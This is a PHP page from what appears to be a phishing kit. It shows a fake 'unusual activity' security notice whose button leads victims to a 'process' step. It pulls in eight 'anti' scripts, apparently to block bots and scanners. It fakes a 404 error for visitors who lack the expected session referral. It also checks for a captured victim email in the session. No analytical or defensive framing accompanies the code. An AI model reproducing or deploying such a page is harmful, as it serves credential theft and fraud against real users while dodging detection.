<?php 
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico">
	<link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
		<title><?php echo $lg_activity['title']?></title>
	<link rel="stylesheet" href="lib/styles/unusual.css">
</head>
<body>
	<div>
		<div class="centered">
			<div style="text-align:center">
				<header>
					<div class="logo"></div>
				</header>
				<div>
					<h1><?php echo $lg_activity['head']?></h1>
					<div>
						<p class="text"><?php echo $lg_activity['body']?>.</p>
					</div>
				<input type="button" class="button" value="<?php echo $lg_activity['bt_secure']?>" id="btn">
				</div>
				</div>
				<div class="hide" id="rotate">
					<div class="spinner">
						<div class="rotate"></div>
						<div class="processing"><?php echo $lg_sign['rotate']?></div>
					</div>
						<div class="overlay"></div>
					</div>
				</div>
			</div>
			<footer>
				<ul>
					<li>
						<a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a>
					</li>
					<li>
						<a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a>
					</li>
				</ul>
			</footer>
		<script>document.getElementById("btn").onclick=function(){
		document.getElementById("rotate").classList.remove("hide");
	setTimeout(function(){
	window.location.href="process"},1800)};
		</script>
</body>
</html>